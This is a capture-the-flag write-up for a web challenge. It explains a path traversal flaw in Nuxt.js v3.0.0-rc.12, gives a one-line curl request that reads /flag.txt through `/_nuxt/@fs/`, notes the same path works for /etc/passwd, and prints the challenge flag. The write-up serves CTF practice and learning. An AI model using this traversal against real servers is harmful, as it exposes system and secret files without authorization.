# A simple website

## Description

> It turns out that learning to make websites using NuxtJS is really fun
>
> <http://ctf.tcp1p.com:45681>
>
> Attachment: dist.zip

## Flag

TCP1P{OuTD4t3d_NuxxT_fR4m3w0RkK}

## Solution

The purpose of this challenge is to read the flag.txt located in the root directory (`/flag.txt`).
The provided web application is build with [Nuxt.js v3.0.0-rc.12](https://github.com/nuxt/nuxt/tree/v3.0.0-rc.12), there is Path Traversal vulnerability (e.g. `/_nuxt/@fs/etc/passwd`).

```console
curl http://ctf.tcp1p.com:45681/_nuxt/@fs/flag.txt
```

## References

- <https://twitter.com/i/web/status/1670635617254776833>
- <https://github.com/SirBugs/Priv8-Nuclei-Templates/blob/main/LFI/nuxt-path-traversal.yaml>
- <https://huntr.dev/bounties/4849af83-450c-435e-bc0b-71705f5be440/>
